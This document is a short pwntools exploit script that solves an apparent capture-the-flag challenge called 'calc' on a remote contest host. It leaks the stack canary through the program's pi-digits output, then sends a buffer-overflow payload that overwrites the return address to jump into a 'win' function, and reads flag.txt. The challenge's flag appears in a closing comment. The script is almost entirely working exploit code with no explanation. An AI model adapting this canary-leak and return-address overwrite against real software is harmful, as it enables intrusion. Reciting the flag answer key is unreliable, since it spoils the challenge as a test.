#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./calc", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript=" b main")
p = remote("challs.pwnoh.io", 13377)

p.sendlineafter(b"operand: ", b"1")
p.sendlineafter(b"operator: ", b"*")
p.sendlineafter(b"operand: ", b"pi")
p.sendlineafter(b" use: ", str("10016").encode())

p.readuntil(b"That is: ")
line = p.readline()
canary = u64(line[-11:-3])

payload = b""
payload += b"A" * 0x28
payload += p64(canary)
payload += p64(0)
payload += p64(elf.sym["win"] + 0x17)
p.sendline(payload)

p.readuntil(b"here: ")

p.sendline(b"/bin/cat flag.txt")

p.interactive() # bctf{cAn4r13S_L0v3_t0_34t_P13_c760f8cc0a44fed9}
